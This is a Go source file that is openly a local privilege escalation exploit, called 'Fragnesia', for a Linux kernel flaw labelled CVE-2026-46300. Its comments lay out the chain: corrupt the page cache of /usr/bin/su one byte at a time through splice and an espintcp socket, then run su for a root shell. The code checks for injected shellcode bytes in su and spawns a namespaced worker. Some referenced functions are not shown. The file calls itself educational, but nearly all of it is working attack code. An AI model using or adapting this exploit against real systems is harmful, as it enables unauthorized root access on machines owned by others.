package main

// Fragnesia — Go port of CVE-2026-46300 LPE.
// For educational purposes — study of kernel page-cache write primitives.
//
// Primitive: when TCP_ULP espintcp is installed after data has been splice()d
// into the receive queue from a file, the kernel AES-GCM decrypts in-place,
// XORing the keystream into the file's page-cache page. One byte per trigger.
//
// Chain:
//   1. Build 256-entry keystream table (nonce → stream byte 0 of CTR block 2)
//   2. For each payload byte: pick nonce so keystream XOR current = desired
//   3. Fire TCP trigger pair (splice + delayed TCP_ULP) for each byte
//   4. Exec /usr/bin/su from patched page-cache → root shell via PTY

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
)

const workerEnv = "_FRAGNESIA_WORKER"

func suAlreadyPatched() bool {
	marker := []byte{0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a}
	f, err := os.Open("/usr/bin/su")
	if err != nil {
		return false
	}
	defer f.Close()
	got := make([]byte, len(marker))
	if _, err := f.ReadAt(got, 0x78); err != nil {
		return false
	}
	for i := range marker {
		if got[i] != marker[i] {
			return false
		}
	}
	return true
}

func main() {
	if os.Getenv(workerEnv) == "1" {
		runWorker()
		return
	}

	if os.Getuid() == 0 {
		syscall.Exec("/bin/bash", []string{"bash"}, os.Environ())
		os.Exit(1)
	}

	patched := runLPE()
	if !patched {
		patched = suAlreadyPatched()
	}

	if patched {
		if err := runRootPTY(); err != nil {
			fmt.Fprintf(os.Stderr, "PTY error: %v\n", err)
		}
		return
	}

	fmt.Fprintln(os.Stderr, "fragnesia-go: failed")
	os.Exit(1)
}

// runLPE spawns a namespace-isolated child via re-exec with Cloneflags.
// Go's runtime is multi-threaded so unshare(CLONE_NEWUSER) is forbidden;
// we use SysProcAttr.Cloneflags which calls clone() before the Go runtime starts.
func runLPE() bool {
	exe, err := os.Executable()
	if err != nil {
		exe = "/proc/self/exe"
	}

	cmd := exec.Command(exe)
	cmd.Env = append(os.Environ(), workerEnv+"=1")
	cmd.Stdout = os.Stderr
	cmd.Stderr = os.Stderr
	cmd.SysProcAttr = &syscall.SysProcAttr{
		Cloneflags: syscall.CLONE_NEWUSER | syscall.CLONE_NEWNET,
		UidMappings: []syscall.SysProcIDMap{
			{ContainerID: 0, HostID: os.Getuid(), Size: 1},
		},
		GidMappings: []syscall.SysProcIDMap{
			{ContainerID: 0, HostID: os.Getgid(), Size: 1},
		},
		GidMappingsEnableSetgroups: false,
	}

	if err := cmd.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "[!] worker: %v\n", err)
		return false
	}
	return suAlreadyPatched()
}
